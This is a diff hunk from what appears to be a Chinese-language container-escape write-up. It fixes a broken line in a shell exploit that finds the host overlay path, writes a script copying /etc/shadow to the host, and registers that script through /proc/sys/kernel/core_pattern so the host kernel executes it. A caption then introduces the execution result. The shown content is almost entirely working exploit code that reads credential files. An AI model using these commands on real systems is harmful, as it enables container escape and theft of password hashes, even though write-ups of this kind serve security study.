@@ -103,8 +103,7 @@ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo '#!/bin/bash' > /tmp/a.sh
 echo "cat /etc/shadow > $host_path/shadow" >> /tmp/a.sh
 chmod +x /tmp/a.sh
-echo -e "|$host_path/tmp/a.sh" > /proc/sys/kernel/
-core_pattern
+echo -e "|$host_path/tmp/a.sh" > /proc/sys/kernel/core_pattern
 ```
 执行效果如下：
 ![](media/16423261310936/16449728593745.jpg)
